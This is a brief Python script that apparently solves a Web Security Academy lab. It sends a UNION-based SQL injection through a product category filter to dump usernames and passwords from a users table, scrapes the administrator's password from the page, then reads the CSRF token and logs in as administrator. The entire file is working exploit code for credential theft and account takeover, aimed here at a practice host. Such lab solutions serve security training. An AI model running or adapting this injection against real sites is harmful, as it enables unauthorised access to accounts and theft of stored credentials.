import requests, urllib
from lxml import html

def encodeURI(s):
    return urllib.parse.quote(s)

session = requests.Session()
URL = "https://0ab800b503345bc4822342e400ed00a1.web-security-academy.net/"

# Extract password

PAYLOAD_1 = "filter?category=%27+UNION+SELECT+username,password+FROM+users--"

response = session.get(URL + PAYLOAD_1).text
parser = html.fromstring(response)

username = "administrator"
password = parser.xpath(f"//th[text()='{username}']/following-sibling::*/text()")[0]

# Login

response = session.get(URL + "login").text
parser = html.fromstring(response)
csrf_token = parser.xpath("//input[@name='csrf']/@value")

PAYLOAD_2 = {
    "csrf": csrf_token,
    "username": username,
    "password": password
}

session.post(URL + "login", data=PAYLOAD_2)

